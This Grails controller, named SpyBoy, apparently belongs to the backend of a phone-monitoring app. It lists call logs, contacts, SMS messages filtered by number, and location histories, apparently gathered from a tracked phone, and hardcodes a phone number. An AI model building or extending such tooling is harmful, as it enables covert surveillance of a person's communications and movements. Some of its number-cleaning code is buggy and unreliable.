package com.xaviar

import grails.converters.JSON;

import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.Location
import com.xaviar.domain.Sms

class SpyBoyController {

	def redisService
	def contactService
	def locationService
	def smsService
	def userService
	def callLogService
	def phoneEventService
	def smsEventService
	def phoneParamsService

	def index() {
	}

	def callLog(){
		//Set<String> subscribers = userService.getUserInfo("token123");
		//UMetaData  uMetaData = new UMetaData();
		//uMetaData.setSimSubscriberId(subscriberId);
		//uMetaData.setToken("token123");
		//def callLogs = CallLog.findByTargetPhone(subscriberId);//callLogService.readAll(uMetaData);
		params.max = Math.min(params.max ? params.int('max') : 10, 100)
		params.phoneNumber = "0543112117";

		[callLogInstanceList:CallLog.list(params), callLogsInstanceTotal: CallLog.count()]

		//		if(!callLogs.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > callLogs.size() ? callLogs.size() : startOffset + max;
		//			}
		//			[callLogInstanceList: callLogs.subList(startOffset,toElement), callLogsInstanceTotal: callLogs.size()]
		//		}else{
		//			[callLogInstanceList: null, callLogInstanceTotal: 0]
		//		}
	}


	def about(){
	}

	def contacts(){
		params.max = Math.min(params.max ? params.int('max') : 50, 100)
		render(template:"contacts",model:[contactInstanceList: Contact.list(sort:"name"), contactInstanceTotal: Contact.count()]);
		//Set<String> subscribers = userService.getUserInfo("token123");
		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
		//
		//		def contactList = contactService.readAll(uMetaData);
		//
		//		if(!contactList.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > contactList.size() ? contactList.size() : startOffset + max;
		//			}
		//			[contactInstanceList: contactList.subList(startOffset,toElement), contactInstanceTotal: contactList.size()]
		//		}else{
		//			[contactInstanceList: null, contactInstanceTotal: 0]
		//		}
	}


	def sms(){
		params.max = Math.min(params.max ? params.int('max') : 50, 100)
		//default sms of first contact
		//List<Contact> firstContacts  = Contact.list(max:"1");
		String number = params.number;//firstContacts.get(0).number;
		def smss=null;
		if(number!=null){
			if(number.length()>8){
				if(!number.find("[#*+-]")){
					number = Long.parseLong(number).toString();
				}else if (number.find("[+]")){
					number.replace("+972","");
					number = Long.parseLong(number).toString();
				}else if(number.find("[-]")){
					number.replace('-',' ');
					number = Long.parseLong(number).toString();
				}
			}

			println (number);
			smss = Sms.findAllByAddressLike("%" + number,[sort:"time",order:"desc"]);
		}
		render(template:"sms",model:[smsInstanceList: smss, smsInstanceTotal: Sms.count()]);
		//Set<String> subscribers = userService.getUserInfo("token123");
		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
		//
		//		def smses = smsService.readAll(uMetaData);
		//
		//		if(!smses.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > smses.size() ? smses.size() : startOffset + max;
		//			}
		//			[smsInstanceList: smses.subList(startOffset,toElement), smsInstanceTotal: smses.size()]
		//		}else{
		//			[smsInstanceList: null, smsInstanceTotal: 0]
		//		}
	}


	def icons(){
	}

	def location(){
		List locations = Location.list(sort:"time");
		[locationInstanceList:locations as JSON,locationInstanceTotal: Location.count()];
	}
}